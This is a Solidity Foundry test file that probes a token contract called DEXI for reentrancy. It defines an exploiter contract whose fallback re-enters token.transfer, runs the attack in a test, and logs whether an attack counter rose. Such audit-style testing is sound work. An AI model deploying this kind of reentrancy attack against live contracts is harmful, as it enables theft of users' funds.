// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/DEXI.sol";

contract ReentrancyExploiter {
    DEXI public token;
    address public victim;
    uint256 public attackCount;
    
    constructor(DEXI _token) public {
        token = _token;
        attackCount = 0;
    }
    
    function beginAttack(address _victim) external {
        victim = _victim;
        // Start the attack with balance transfer
        token.transfer(victim, token.balanceOf(address(this)));
    }

    fallback() external payable {
        attackCount++;
        // Attempt reentrancy
        token.transfer(victim, token.balanceOf(address(this)));
    }
}

contract DEXIReentrancyTest is Test {
    DEXI public token;
    ReentrancyExploiter public exploiter;
    
    address constant OWNER = address(0x1234);
    address constant ATTACKER = address(0x5678);
    address constant VICTIM = address(0x9ABC);

    function setUp() public {
        vm.startPrank(OWNER);
        token = new DEXI();
        // Remove max transaction amount restrictions
        token._setMaxTxAmount(type(uint256).max);
        // Ensure owner is excluded from fees
        token.excludeFromFee(OWNER);
        vm.stopPrank();
    }

    function testReentrancyInTransfer() public {
        // Transfer a small amount (1 token) to attacker
        vm.prank(OWNER);
        token.transfer(ATTACKER, 1);

        vm.startPrank(ATTACKER);
        // Deploy exploiter contract
        exploiter = new ReentrancyExploiter(token);
        
        // Transfer the small amount to exploiter contract
        token.transfer(address(exploiter), 1);
        
        // Get initial state before attack
        console.log("--- BEFORE-Trigger ---");
        uint256 exploiterBalanceBefore = token.balanceOf(address(exploiter));
        uint256 attackCountBefore = exploiter.attackCount();
        console.log("Exploiter token balance before:", exploiterBalanceBefore);
        console.log("Attack count before:", attackCountBefore);

        console.log("--- Trigger Attack ---");
        exploiter.beginAttack(VICTIM);
        
        // Get final state after attack
        console.log("--- AFTER-Trigger ---");
        uint256 exploiterBalanceAfter = token.balanceOf(address(exploiter));
        uint256 attackCountAfter = exploiter.attackCount();
        console.log("Exploiter token balance after:", exploiterBalanceAfter);
        console.log("Attack count after:", attackCountAfter);

        // Final vulnerability determination
        if(attackCountAfter > attackCountBefore) {
            console.log("Vulnerability Exists: attackCount increased indicating successful reentrancy");
        } else {
            console.log("Vulnerability not Exist: No attackCount increase detected");
        }

        // Original test validations
        assertEq(exploiterBalanceBefore, 1, "Exploiter balance before attack is not 1");
        assertEq(exploiterBalanceAfter, 0, "Exploiter should have 0 balance after transfer");
        assertEq(token.balanceOf(VICTIM), 1, "Victim should receive 1 token");
        
        vm.stopPrank();
    }
}